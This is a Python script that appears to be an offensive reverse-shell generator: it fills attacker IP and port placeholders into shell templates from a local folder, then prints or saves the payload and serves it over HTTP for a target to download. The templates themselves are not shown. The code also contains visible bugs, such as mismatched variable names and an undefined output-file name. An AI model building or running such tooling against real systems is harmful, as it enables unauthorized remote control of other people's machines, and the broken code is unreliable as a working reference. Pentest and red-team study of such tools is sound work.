import argparse
import shells
import http.server
import socketserver

shellstring = 'noShell'

class ShellHandler(http.server.BaseHTTPRequestHandler):
    
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(shellString.encode())

def printShells(help=''):
    print('Available shells:')
    for shell in shells.shells:
        print(shell['name'])

parser = argparse.ArgumentParser(description='A script to generate reverse shells on various languages.')
parser.add_argument('shell', metavar='shellLanguage', type=str,
                    help='Language to identify the shell to be built. Use -s to see available shells.')

parser.add_argument('-i', dest='localAddr', help='Address to connect back to')
parser.add_argument('-p', dest='localPort', help='Port to connect back to')
parser.add_argument('-o', dest='outfile', help='File to write the reverse shell to')
parser.add_argument('--httpport', dest='httpPort', help='Port to start HTTP server in', default=80)

args = parser.parse_args()
results = list(filter(lambda shell: shell['name'] == args.shell, shells.shells))
if len(results) > 0:
    selectedShell = results[0]
else:
    print('ERROR: Unregognized shell type\n')
    printShells()
    parser.print_help()
    exit()

if not args.localAddr or not args.localPort and (selectedShell['address'] or selectedShell['port']):
    print('Must specify IP and port!')
    parser.print_help()
    exit()

shellFile = open('shells/'+selectedShell['file'], 'r')
shellContents = shellFile.read()
shellContents = shellContents.replace('[LIP]', args.localAddr).replace('[LP]', args.localPort)

if args.outfile:
    outfile = open(outfile, 'w+')
    outfile.write(shellContents)
else:
    print (shellContents)
shellString = shellContents
with socketserver.TCPServer(("", args.httpPort), ShellHandler) as httpd:
    httpd.serve_forever()

